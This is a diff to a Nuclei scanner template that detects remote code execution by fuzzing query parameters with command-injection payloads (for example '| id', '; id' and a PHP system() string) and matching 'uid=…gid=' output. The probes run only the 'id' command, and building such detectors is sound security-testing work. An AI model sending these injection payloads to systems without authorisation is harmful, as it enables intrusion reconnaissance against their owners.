@@ -2,7 +2,6 @@ id: RCE
 
 # Usage: 
 # echo "http://testphp.vulnweb.com/listproducts.php?cat=" | nuclei -t rce.yaml | awk '{print $6}'
-# Only for single-parameter URLs.
 
 info:
   name: Remote Code Execution (RCE) Detection
@@ -16,7 +15,7 @@ requests:
       - "{{BaseURL}}{{payload}}"
 
     payloads:
-      payload:
+      injection:
         - '| id'
         - '; id'
         - '&& id'
@@ -41,10 +40,17 @@ requests:
         - '"%2B`id`%2B"'
         - '".system(%27id%27); $dummy="'
 
-    stop-at-first-match: true
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
 
+    stop-at-first-match: true
+    matchers-condition: or
     matchers:
       - type: regex
+        part: body
         regex:
           - 'uid=[0-9a-zA-Z_()-. ]+gid=[0-9a-zA-Z_()-. ]+'
-        part: body
